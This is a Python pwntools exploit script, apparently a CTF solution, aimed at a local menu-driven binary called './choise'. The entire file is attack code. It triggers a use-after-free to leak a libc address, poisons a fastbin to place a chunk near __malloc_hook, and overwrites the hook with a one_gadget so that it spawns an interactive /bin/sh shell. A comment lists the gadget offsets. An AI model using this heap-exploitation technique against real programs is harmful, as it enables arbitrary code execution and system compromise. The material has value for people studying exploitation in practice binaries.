from pwn import *
context(arch='i386',os='linux',log_level='debug')

sl = lambda x:io.sendline(x)
s = lambda x:io.send(x)
rn = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x, drop=True)
r = lambda :io.recv()
it = lambda: io.interactive()
success = lambda x, y:log.success(x + ' '+ hex(y))

binary = './choise'

io = process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def menu(c):
    ru('Your choice: ')
    sl(str(c))


def add(name, a, b, c, d):
    menu(1)
    ru('Found free slot: ')
    idx = int(ru('\n'))
    ru('Enter player name: ')
    s(name)
    ru('Enter attack points: ')
    sl(str(a))
    ru('Enter defense points: ')
    sl(str(b))
    ru('Enter speed: ')
    sl(str(c))
    ru('Enter precision: ')
    sl(str(d))
    return idx


def remove(idx):
    menu(2)
    ru('Enter index: ')    
    sl(str(idx))

def select(idx):
    menu(3)
    ru('Enter index: ')    
    sl(str(idx))

def edit(c, arg):
    menu(4)
    menu(c)
    ru('Enter new name: ')
    sleep(0.1)
    s(arg)
    sl('0')

def showP():
    menu(5)

def showT():
    menu(6)

add('a'*0x7f+'\n', 1,1,1,1)
add('a'*0x60+'\n', 1,1,1,1)
select(0)
remove(0)
showP()
ru('Name: ')
leak = u64(ru('\n').ljust(8, '\x00'))
success('leak address', leak)
base = leak - 0x3c4b78
success('libc base', base)
libc.address = base
malloc_hook = libc.sym['__malloc_hook']
chunk_addr = malloc_hook - 0x23
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = base + 0xf02a4
select(1)
remove(1)
edit(1, 'a'*0x60+'\n')
edit(1, p64(chunk_addr+0xff000000000000)+'\n')
edit(1, p64(chunk_addr)+'\n')
add('a'*0x60+'\n', 1,1,1,1)
add('a'*0x13+p64(one_gadget)[:-2]+'a'*0x47+'\n', 1,1,1,1)
select(1)
edit(1, 'a'*0x13+p64(one_gadget)[:-2]+'a'+'\n')
edit(1, 'a'*0x13+p64(one_gadget)[:-2]+'\n')
#gdb.attach(io,'b *0x401949')
#raw_input()
sl('1')
sl('1')
it()